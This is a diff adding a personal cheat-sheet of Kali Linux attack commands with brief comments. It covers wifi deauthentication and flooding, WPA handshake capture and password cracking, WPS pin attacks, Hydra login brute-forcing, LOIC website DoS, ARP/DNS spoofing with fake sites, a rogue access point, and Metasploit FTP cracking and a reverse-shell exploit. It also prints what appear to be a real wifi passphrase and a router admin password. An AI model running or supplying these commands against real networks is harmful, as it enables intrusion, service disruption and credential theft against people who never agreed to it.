@@ -1,0 +1,353 @@
+STUFF IN THIS FILE:
+monitor mode
+airodump of target (can see if handshakes captured)
+deauthentication attk (to capture handshakes) using aireplay-ng
+router dictionary attack using aircrack-ng (packet injection tool)
+decrypt packets using airdecap-ng
+pyrit to speed up pw recovery (multiple cores, aircrack only uses 1 core)
+hashcat is even faster than pyrit
+dos attack a network using mdk3
+low orbit ion cannon dos attack a website
+see what processes use what ports
+wps pin recovery using Reaver
+dictionary attack on router login using Hydra
+MITM attacks: arp-spoofing and dns-spoofing
+ftp
+metasploit
+
+
+// max power
+ifconfig wlan0 down
+iw reg set BO              // sets country code to bolivia for max pwr
+iwconfig wlan0 txpower 30
+ifconfig wlan0 up
+iwconfig wlan0 rate 1M
+
+
+iwconfig
+ originally set to managed mode on wlan0
+ifconfig wlan0 down
+macchanger -r wlan0      // -r means random mac addr
+  // first part of mac addr is actually manufacturer ID, can't look up random 
+ifconfig wlan0 up
+  // iwconfig to verify new mac addr
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon // sees all networks
+  // copy bssid (macaddr) of target access point
+airodump-ng --bssid macaddr wlan0mon
+  // bssid = AP mac addr, ssid = name of network
+
+
+// deauthentication attk to kick someone off network
+  // there is also dissassociation attack which is like same thing in reverse
+  // there's also just dos attack to overwhelm network
+
+  // deauth attk changes macaddr to same as router and kicks others off
+  // look at channel the wifi is broadcasting on,
+airodump-ng --channel ?? --bssid macaddr nameofwifi
+  // all you need is macaddr of access point and macaddr of client
+  //aireplay-ng is a packet injection tool, to create and send packets
+
+aireplay-ng --deauth 2000   // send 2000 "good-bye" packets 
+  // sends a few per second, so 2000 will last for a couple minutes
+aireplay-ng --deauth 2000 -a accessptmacaddr -c macaddrofclienttobootoff
+  e.g. aireplay-ng --deauth 2000 -a 00:71:C2:B3:FF:90 -c 60:F1:89:68:F5:2E wlan0mon
+
+
+aireplay-ng -9 wlan0mon  // test injection
+  // should say "injection is working!"
+
+// this deauth attk is useful for capturing handshakes
+// when they need to reconnect this forces them to reverify
+// can find a bunch of useful information this way
+
+
+// WPA/WPA2 password recovery (very simplified overview)
+// e.g. tablet needs way to verify it knows password, however,
+// cant actually send the password to the router
+// because anyone listening could listen for the password
+// puts it through a hashing algorithm, using
+// ssid, mac, pw -> hash alg -> hash
+// from there they make the encryption key which allows
+// tablet and access point to encrypt/decrypt packets
+// need to decrypt packets (like ones seen in wireshark)
+
+// once you have all the pieces you can decrypt all packets on network
+// have ssid, macaddr, need pw
+// we have the hash, so we run through a huge list of pws,
+// and when one gives us the known hash, that means we've guessed
+// the correct password
+
+// for dictionary attack
+airodump-ng --bssid macaddrofAP --channel channelnumber --write Desktop/WPAsample wlan0mon
+// now need to wait until a handshake takes place
+// handshake is authentication process, can look at all useful data to plug into
+// formula for dictionary attack
+// can send deauth packets (in seperate terminal) for smaller networks
+// when a handshake happens, in top right it will give a WPA handshake: ... message
+// can right click WPA-sample-01.cap (saved stuff) and open in wireshark
+// all this data in wireshark will still be encrypted at this point
+// next will loop through passwords in a formula
+// (added my wifi password to pw list to test)
+
+
+// to run the dictionary attack we use aircrack-ng 
+// (by the way, the name of tools altogether is called aircrack,
+// one of the specific tools is called aircrack-ng)
+// aircrack-ng takes 2 pieces of info, one is the capture file we just opened in wireshark
+// the other is the password list, e.g.:
+
+aircrack-ng path/to/cap/file -w path/to/password/list
+// this will then give password or say it is found
+// can take quite a bit of time for millions of passwords
+// now that we have the password, we have all the pieces to 
+// decrypt packets over the network
+
+// airdecap-ng is the tool used to decrypt the packets
+airdecap-ng -e 'NAMEOFNETWORK' -p passwordofnetwork filetodecrypt(.cap)
+  // this will build a whole new file that is decrypted (-dec filename)
+  e.g.: airdecap-ng -e 'HOME-2397-2.4' -p RJUN79AFA9HU4J3P ~/Desktop/WPAsample-01.cap
+  // then open this with wireshark
+
+//using pyrit to speed up pw recovery (uses all the cores in your system)
+  // aircrack only uses 1 core, pyrit lets you choose multi-core cpu OR gpu
+  // also is hashcat to pw crack with graphics card(s) (the best pw cracker)
+pyrit list_cores
+ // requires capture file and pw list
+pyrit -r path/to/.cap/file analyze
+  // capture file needs valid handshake inside
+pyrit eval   // this will show pws available
+pyrit -i path/to/passwords.txt import_passwords
+pyrit -e WIFINAME create_essid
+// notice pyrit eval will be less
+// automatically filters pws not suitable for wpa/wpa2 (not long enough, dup, etc)
+// could find wpa pw list
+pyrit batch
+pyrit -r path/to/.cap/file attack_db
+// this will give pw if found
+// even incredibly complex pws can be cracked using reaver
+// to delete essid and pws from database 
+pyrit -e WIFINAME delete_essid
+rm -rf /pyrit/blobspace/password/
+// you can import more than one password list into pyrit at a time
+// hashcat is even faster than pyrit
+
+// FOR DOS ATTKS
+// ultimately should have 5 terminals open (airodump, a, b, d, m):
+airmon-ng stop wlan0mon
+iwlist wlan0 scan
+// this will list surrounding APs, make note of essid, bssid (Address), channel #
+e.g. ESSID:"HOME-2397-2.4", Address: 00:71:C2:B3:FF:90, Channel:1
+// now create blacklist file
+echo bssid(Address) > blacklist
+put airmon-ng into monitor mode
+airmon-ng start wlan0  (if not alrdy)
+ifconfig wlan0 up
+mdk3
+// this will send continuous deauth packets to flood the network
+mdk3 wlan0mon d -b /path/to/echoed/blacklist -c channelnumber
+// this will begin sending packets to flood the network, may take a second to work
+// 2nd terminal:
+// this will boot everyone off network and not allow them to reconnect
+// -m after 'mdk3 a' will authenticate real mac addresses instead of 00:00:00:00:00:00
+mdk3 wlan0mon a -m -i bssid(Address)
+(authentication flood)
+// 3rd terminal:
+//Michael failure stopping all wireless traffic if target AP supports TKIP
+mdk3 wlan0mon m -t 00:71:C2:B3:FF:90
+// This floods a bunch of fake APs to any clients in range (only effective to windows 
+// clients and maybe some other devices, Macs are protected against this).
+mdk3 monX b -t 00:71:C2:B3:FF:90 -c 1
+(beacon flood)
+
+
+
+// LOIC - Low Orbit Ion Cannon website DoS program
+mono ~/LOIC-master/src/bin/Debug/LOIC.exe
+
+// commands to see which processes using which ports
+sudo lsof -i
+sudo netstat -lptu
+sudo netstat -tulpn
+lsof -i :22  // specific port
+whatis dhclient // explain shit
+
+
+// REAVER: WPS (wifiprotectedsetup) pin recovery tool
+airodump-ng --wps wlan0mon
+// shows new wps column (1.0 means wps enabled still)
+router login: admin password: Z9JKk5PWRr
+reaver -i wlan0mon -b bssidtoattack -c apchannel -f -a -w -vv -K 1
+  // -i for interface -b for bssid -c for channel
+  // -f for fixed, disables channel hoping, -a autodetect best options
+  // -w mimics windows 7 registrar, -v for verbose, -vv for very verbose
+  // -K 1  is a pixie attack (quick attk), runs through common pins
+  // then run without -K 1 if that doesn't work
+  bssid: 00:71:C2:B3:FF:90, channel: 1
+reaver -i wlan0mon -b 00:71:C2:B3:FF:90 -c 1 -f -a -w -vv -K 1
+
+
+// HYDRA performs dictionary attack on your routers login 
+  // needs both username and password lists 
+hydra http://[10.0.0.1]/login.html -e ns -F -V -t 4 -l admin -P path/to/pws.txt
+  // -e ns, will try 2 extra pws for each, blank and the username itself
+  // -F means exit when we find a login
+  // -V display the results
+  // -t 4 number of tasks to run in parallel  (4,8,16)
+  // -L for list, -l for just one
+  // -P for password.txt list, -p for just one password
+// possibly something like this
+hydra hackme -V -l smithy -P /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=07b7ebb2faea96f8471ecdb759e68108; security=low"
+
+
+// DNS spoofing: type of MITM attack
+  // couple types of MITM attack, watching & positioning inbetween
+  // can position inbetween user and AP with ARP spoofing
+  // arp is how APs know which IP correlates to which mac addr 
+  // address resolution protocol (arp)
+  // internet uses the IP, router uses the mac addr, arp correlates the two
+  // browser behind the scenes asks dns server what the IP addr of website.com is
+  // dns server responds with IP addr, dns spoofing will after achieving MITM will
+  // allow to tell end user that website.com has different IP addr (say, of the attacker)
+  // attacker can host fake webpage to gain credentials
+  // SO IN SUMMARY, 2 STEP PROCESS
+  // Step 1: arp spoofing, gain entry in between end user and AP
+  // Step 2: dns spoofing, give end user wrong ip addr when looking server(site) IPs up
+    apt-get install bridge-utils // if not alrdy installed
+  // lets our computer act as a bridge, lets it forward packets based on mac addr
+  // rather than ip, which is how routers work
+  // need to enable IP forwarding, which lets you determine path the packets are sent
+  // used by routers to determine where to send data usually
+  echo 1 > /proc/sys/net/ipv4/ip_forward   
+  // next, going to create fake dns host file
+  // to print local IP address:
+ip route get 8.8.8.8 | awk '{print $NF; exit}'
+  // cat spoofhosts.txt:
+  10.0.0.174 www*
+  10.0.0.174 bacon.com
+  // next need a file for the website
+  // webfiles are in /var/www/html/sample.html
+  // copied my threadly index2.html to this folder
+  // can check open it with: iceweasel index2.html
+  // kali has a built-in webserver, to start it:
+apache2ctl start
+  // fully qualified domain name error is ok
+  // need one terminal for arp spoofing (client to AP MITM)
+  // second terminal for dns spoofing (website redirect)
+arpspoof -t victimslanip routerslanip && arpspoof -t routerslanip victimslanip
+  // basically switched order
+arpspoof -t 10.0.0.118 10.0.0.1 && arpspoof -t 10.0.0.1 10.0.0.118  
+  // PING to see every device on local area network
+  // need: ip addr & subnet max
+  // e.g.: kali local ip addr is 10.0.0.174, subnet mask is 255.255.255.0  (ifconfig)
+  // look at where 0's are in subnet mask, then replace those spots with 255 in ip address
+  // result is 10.0.0.255
+  ping 10.0.0.255  
+  arp -a   // similar command for local area network info
+  // I also installed:
+ipscan   // this is the best one to find 'kali' ip and victim ip 
+  // 2nd terminal:
+dnsspoof -f ~/Desktop/spoofhosts.txt host victimslanip and udp port 53
+  e.g. dnsspoof -f ~/Desktop/spoof/spoofhosts.txt host 10.0.0.118 and udp port 53
+  // 53 is just a standard port of dns
+  // can run the two terminals (arpspoof and dnsspoof) in any order  
+  // dhcp allows assigning ip addresses to clients like router
+
+// The slash and the number following it is just a shorthand way to write a subnet mask. 
+// It's called CIDR (Classless Inter-Domain Routing) notation. It's also commonly referred 
+// to as the prefix length.
+// The number after the slash represents the number of consecutive 1's in the subnet mask. 
+// For example, 192.168.10.0/24 is equal to the network 192.168.10.0 with a 255.255.255.0 
+// subnet mask. If you convert 255.255.255.0 to binary, you end up with 24 consecutive 1's
+
+
+
+// Fake access point prevention pt1
+   leafpad /etc/dnsmasq.conf
+   leafpad ~/Desktop/fakehosts.conf:
+    54.186.250.79 buckysbacon.com
+    54.186.250.79 buckystuna.com
+  
+ // access point:
+airbase-ng -e 'NAMEOFWIFI' -c 5 wlan0mon
+ // 2nd terminal, dns server:
+dnsmasq -C /etc/dnsmasq.conf -H ~/Desktop/fakehosts.conf -d
+ // 3rd terminal, forward internet data (act as MITM) (bring up virtual default gateway)
+ // make laptop act as wireless router
+ifconfig at0 10.0.0.1/24 up 
+ // last thing, configure the routes
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 -v
+  // networkip, netmask, gatewayip
+ // since MITM attack, need to enable ip forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+ // there's input, output, forward, default router rule is forward
+iptables -P FORWARD ACCEPT
+ // postrouting: after routing send data out through eth0, 
+ // send to real internet through eth0
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+ // for fake website on own computer: apache2ctl start
+ // command to show router's ip address:    // 10.0.0.1
+ip route show | grep -i 'default via'| awk '{print $3 }'
+card in monitor mode
+
+//possibly:
+//brctl addbr Bridge
+//brctl addif Bridge eth0
+//brctl addif Bridge at0
+//ifconfig bridge up
+
+
+// METASPLOIT
+// Metasploitable2 is a testing environment VM
+service postgresql start   // starts database to store metasploit exploits, runs faster
+msfconsole 
+clear
+?      // info
+show exploits
+search <keyword>       // e.g. search mysql
+info <exploit name>     // e.g. info auxiliary/scanner/mysql/mysql_login
+use <name of exploit>    // e.g. use auxiliary/scanner/mysql/mysql_login
+back
+some intelligence gathering (can use pyRecon):
+whois <domain name>  // lots of info
+host <domain name>  // get IP address
+nmap -F <IP address of server>  // tells me services running/ports open
+search ssh_version
+info auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_version
+show options   // first command to type after using tool
+set RHOSTS 162.243.3.200   // ubuntu server
+run
+
+// how to crack a ftp password
+search ftp_login
+info auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ftp/ftp_login
+show options
+set RHOSTS 162.243.3.200
+set THREADS 30
+set USERNAME root    // can try a list of usernames
+set PASS_FILE ~/Desktop/passwords.txt
+show options
+exploit
+
+// in Unreal exploit (old exploit):
+show options
+set RHOSTS
+show payloads
+// a payload is something you can do once the exploit worked
+// exploit gains access
+// payload does something after gaining access
+// cmd/unix/reverse payload that gains a backdoor to the system
+set payload cmd/unix/reverse
+show options // payload options
+set LHOSTS
+exploit
+// now in terminal
+whoami
+
+
+
+
+ 
